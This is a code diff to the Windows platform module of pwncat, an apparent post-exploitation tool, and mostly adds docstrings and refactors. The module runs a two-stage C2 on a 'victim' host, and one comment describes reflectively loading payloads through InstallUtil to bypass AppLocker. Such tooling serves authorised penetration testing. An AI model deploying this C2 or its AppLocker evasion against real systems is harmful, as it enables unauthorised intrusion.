@@ -15,7 +15,7 @@ import textwrap
 import subprocess
 from io import (BytesIO, StringIO, RawIOBase, TextIOWrapper, BufferedIOBase,
                 UnsupportedOperation)
-from typing import List, Union, BinaryIO
+from typing import List, Union, BinaryIO, Optional
 from subprocess import TimeoutExpired, CalledProcessError
 from dataclasses import dataclass
 
@@ -392,15 +392,6 @@ class Windows(Platform):
 
         self._bootstrap_stage_two()
 
-        # This is a dirty hack
-        old_close = self.channel.close
-
-        def new_close():
-            self.run_method("StageTwo", "exit")
-            old_close()
-
-        self.channel.close = new_close
-
         self.refresh_uid()
 
         self.setup_prompt()
@@ -408,9 +399,25 @@ class Windows(Platform):
         # Load requested libraries
         # for library, methods in self.LIBRARY_IMPORTS.items():
         #     self._load_library(library, methods)
+        #
+
+    def exit(self):
+        """Ensure the C2 exits on the victim end. This is called automatically
+        by session.close, and shouldn't be called manually."""
+
+        self.run_method("StageTwo", "exit")
 
     def run_method(self, typ: str, method: str):
-        """ Run a method reflectively from the loaded StageTwo assembly """
+        """Run a method reflectively from the loaded StageTwo assembly. This
+        can technically run any .Net method, but doesn't implement a way to
+        abstractly pass arguments. Instead, all the StageTwo methods take
+        arguments through stdin.
+
+        :param typ: The type name where the method you'd like to execute resides
+        :type typ: str
+        :param method: The name of the method you'd like to execute
+        :type method: str
+        """
 
         self.channel.send(f"{typ}\n{method}\n".encode("utf-8"))
 
@@ -429,7 +436,9 @@ function prompt {
     def _ensure_libs(self):
         """This method checks that stageone.dll and stagetwo.dll exist within
         the directory specified by the windows_c2_dir configuration. If they do
-        not, a release copy is downloaded from GitHub."""
+        not, a release copy is downloaded from GitHub. The specific release version
+        is defined by the PWNCAT_WINDOWS_C2_RELEASE_URL variable defined at the top
+        of this file. It should be updated whenever a new C2 version is released."""
 
         location = pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
         location.mkdir(parents=True, exist_ok=True)
@@ -450,14 +459,12 @@ function prompt {
                             shutil.copyfileobj(stagetwo, output)
 
     def _bootstrap_stage_two(self):
-        """This takes the stage one C2 (powershell) and boostraps it for stage
-        two. Stage two is C# code dynamically compiled and executed. We first
-        execute a small C# payload from Powershell which then infinitely accepts
-        more C# to be executed. Further payloads are separated by the delimeters:
-
-        - "/* START CODE BLOCK */"
-        - "/* END CODE BLOCK */"
-        """
+        """This routine upgrades a standard powershell or cmd shell to an
+        instance of the pwncat stage two C2. It will first locate a valid
+        writable temporary directory (from the list below) and then upload
+        stage one to that directory. Stage one is a simple DLL which recieves
+        a base64 encoded, gzipped payload to reflectively load and execute.
+        We run stage one using Install-Util to bypass applocker."""
 
         possible_dirs = [
             "\\Windows\\Tasks",
@@ -680,17 +687,6 @@ function prompt {
         """
         return self.host_uuid
 
-    def interactive_read(self):
-        """
-        Read data from the attacker to be sent directly to the victim
-        """
-
-        try:
-            data = input().encode("utf-8") + b"\r"
-            return data
-        except EOFError:
-            raise RawModeExit
-
     def interactive_loop(self, interactive_complete: "threading.Event"):
         """
         Interactively read input from the attacker and send it to an interactive
@@ -733,8 +729,6 @@ function prompt {
         # Reset the tracker
 
         if value:
-            # Shift to interactive mode
-            cols, rows = os.get_terminal_size()
             self.run_method("PowerShell", "start")
             output = self.channel.recvline()
             if not output.strip().startswith(b"INTERACTIVE_START"):
@@ -746,21 +740,32 @@ function prompt {
         if not value:
             self._interactive = False
 
-    def process_output(self, data):
-        """ Process stdout while in interactive mode """
+    def process_output(self, data: bytes):
+        """Process stdout while in interactive mode. This is called
+        each time the victim output thread receives data. You can modify
+        the input data and return a new copy if needed before output to
+        the screen.
+
+        :param data: the data received from the victim in interactive mode
+        :type data: bytes
+        """
 
         transformed = bytearray(b"")
         has_cr = False
 
         for b in data:
+
+            # Basically, we just transform bare \r to \r\n
             if has_cr and b != ord("\n"):
                 transformed.append(ord("\n"))
-            if b == ord("\r"):
-                has_cr = True
-            else:
-                has_cr = False
 
+            # Track whether we had a carriage return
+            has_cr = b == ord("\r")
+
+            # Add the character to the resulting array
             transformed.append(b)
+
+            # Track interactive exit that we didn't explicitly request
             if INTERACTIVE_END_MARKER[self.interactive_tracker] == b:
                 self.interactive_tracker += 1
                 if self.interactive_tracker == len(INTERACTIVE_END_MARKER):
@@ -769,6 +774,7 @@ function prompt {
             else:
                 self.interactive_tracker = 0
 
+        # Return transformed data
         return transformed
 
     def open(
@@ -780,6 +786,7 @@ function prompt {
         errors: str = None,
         newline: str = None,
     ):
+        """ Mimick the built-in open method. """
 
         # Ensure all mode properties are valid
         for char in mode:
@@ -819,7 +826,12 @@ function prompt {
         return stream
 
     def _do_which(self, path: str):
-        """ Stub method """
+        """Locate a binary of the victim. This implements the actual interaction
+        with the victim. The `Platform.which` method implements the caching mechanism.
+
+        :param path: name of the binary you are looking for
+        :type path: str
+        """
 
         try:
             p = self.run(
@@ -831,19 +843,22 @@ function prompt {
             return None
 
     def refresh_uid(self):
-        """ Retrieve the current user ID """
+        """Retrieve the current user ID. For Windows, this is done
+        through System.Security.Principal.WindowsIdentity::GetCurrent().User."""
 
         self.user_info = self.powershell(
             "[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value"
         )[0]
 
     def getuid(self):
+        """ Retrieve the cached User ID """
 
         return self.user_info
 
     def new_item(self, **kwargs):
         """Run the `New-Item` commandlet with specified arguments and
-        raise the appropriate local exception if requried."""
+        raise the appropriate local exception if requried. For a list of
+        valid arguments, see the New-Item help documentation."""
 
         command = "New-Item "
         for arg, value in kwargs.items():
@@ -866,7 +881,13 @@ function prompt {
                 raise PermissionError(kwargs["Path"])
 
     def abspath(self, path: str) -> str:
-        """ Convert the given relative path to absolute """
+        """Convert the given relative path to absolute.
+
+        :param path: a relative path
+        :type path: str
+        :returns: an equivalent absolute path
+        :rtype: str
+        """
 
         try:
             result = self.powershell(f'Resolve-Path -Path "{path}" | Select Path')
@@ -905,7 +926,14 @@ function prompt {
             raise PermissionError(path) from exc
 
     def getenv(self, name: str) -> str:
-        """ Stub method """
+        """Retrieve the value of a given environment variable in the
+        current shell.
+
+        :param name: name of the environment variable
+        :type name: str
+        :returns: value of the variable
+        :rtype: str
+        """
 
         try:
             result = self.powershell(f"$env:{name}")
@@ -914,17 +942,39 @@ function prompt {
             raise KeyError(name) from exc
 
     def link_to(self, target: str, path: str):
-        """ Create hard link at ``path`` pointing to ``target`` """
+        """Create hard link at ``path`` pointing to ``target``. This will
+        likely result in a PermissionError exception on Windows. It is
+        implemented with the New-Item powershell commandlet.
+
+        :param target: the path to the target of the link
+        :type target: str
+        :param path: the path to the new link object
+        :type path: str
+        """
 
         self.new_item(ItemType="HardLink", Path=path, Target=target)
 
     def symlink_to(self, target: str, path: str):
-        """ Stub method """
+        """Create a symlink at ``path`` pointing to ``target``. This is
+        implemented using the New-Item powershell commandlet.
+
+        :param target: the path to the target of the link
+        :type target: str
+        :param path: the path to the new link object
+        :type path: str
+        """
 
         self.new_item(ItemType="SymbolicLink", Path=path, Target=target)
 
     def listdir(self, path: str):
-        """ Stub method """
+        """Return a list of items in the directory at the given relative
+        or absolute directory path.
+
+        :param path: relative or abosolute directory path
+        :type path: str
+        :returns: list of file or directory names
+        :rtype: List[str]
+        """
 
         try:
             result = self.powershell(f'Get-ChildItem -Force -Path "{path}" | Select ')
@@ -938,21 +988,33 @@ function prompt {
                 raise PermissionError(path)
 
     def lstat(self):
-        """ Stub method """
+        """ Perform stat on a link instead of the target of the link. """
+
+        raise PlatformError("lstat not implemented for Windows")
 
     def mkdir(self, path: str):
-        """ Stub method """
+        """Create a new directory. This is implemented with the New-Item
+        commandlet.
+
+        :param path: path to the new directory
+        :type path: str
+        """
 
         self.new_item(ItemType="Directory", Path=path)
 
     def readlink(self):
-        """ Stub method """
+        """ Read the target of a filesystem link """
 
-    def reload_users(self):
-        """ Stub method """
+        raise PlatformError("readlink not implemented for Windows")
 
     def rename(self, src: str, dst: str):
-        """ Stub method """
+        """Rename a file
+
+        :param src: path to the source file
+        :type src: str
+        :param dst: path or new name for the destination file
+        :type dst: str
+        """
 
         try:
             self.powershell(f'Rename-Item -Path "{src}" -NewName "{dst}"')
@@ -962,9 +1024,16 @@ function prompt {
             raise PermissionError(src)
 
     def rmdir(self, path: str, recurse: bool = False):
-        """ Stub method """
+        """Remove a directory, optionally remove all contents first.
+
+        :param path: path to a directory to remove
+        :type path: str
+        :param recurse: whether to recursively remove all contents first
+        :type recurse: bool
+        """
 
         # This is a bad solution, but powershell is stupid
+        # NOTE: this is because there's no way to stop powershell from prompting for confirmation
         if not recurse and len(self.listdir(path)) != 0:
             raise FileNotFoundError(path)
 
@@ -978,8 +1047,15 @@ function prompt {
                 raise FileNotFoundError(path)
             raise PermissionError(path)
 
-    def stat(self, path: str):
-        """ Stub method """
+    def stat(self, path: str) -> stat_result:
+        """Perform a stat on the given path, returning important file
+        system details on the file.
+
+        :param path: path to an existing file
+        :type path: str
+        :returns: the stat data
+        :rtype: stat_result
+        """
 
         try:
             props = self.powershell(f'Get-ItemProperty -Path "{path}"')[0]
@@ -1026,8 +1102,10 @@ function prompt {
 
         return result
 
-    def tempfile(self, mode: str, suffix: str = None):
-        """ Stub method """
+    def tempfile(
+        self, mode: str, length: Optional[int] = None, suffix: Optional[str] = None
+    ):
+        """ Create a temporary file in a safe directory. Optionally provide a suffix """
 
         if suffix is None:
             suffix = ""
@@ -1041,7 +1119,7 @@ function prompt {
         name = ""
 
         while True:
-            name = f"tmp{pwncat.util.random_string(length=6)}{suffix}"
+            name = f"tmp{pwncat.util.random_string(length=length)}{suffix}"
             try:
                 self.new_item(ItemType="File", Path=str(path / name))
                 break
@@ -1051,7 +1129,11 @@ function prompt {
         return (path / name).open(mode=mode)
 
     def touch(self, path: str):
-        """ Stub method """
+        """Touch a file (aka update timestamps and possibly create).
+
+        :param path: path to new or existing file
+        :type path: str
+        """
 
         try:
             self.powershell(f'echo $null >> "{path}"')
@@ -1060,13 +1142,17 @@ function prompt {
                 raise FileNotFoundError(path)
             raise PermissionError(path)
 
-    def umask(self):
-        """ Stub method """
+    def umask(self, mask: Optional[int] = None):
+        """ Set or retrieve the current umask value """
 
         raise NotImplementedError("windows platform does not support umask")
 
     def unlink(self, path: str):
-        """ Stub method """
+        """Remove an entry from the file system.
+
+        :param path: path to a file or empty directory
+        :type path: str
+        """
 
         # This is a bad solution, but powershell is stupid
         try:
@@ -1084,7 +1170,10 @@ function prompt {
             raise PermissionError(path)
 
     def whoami(self) -> str:
-        """ Stub method """
+        """Retrieve the current user name
+
+        NOTE: This is not cached.
+        """
 
         try:
             result = self.powershell("whoami")[0]
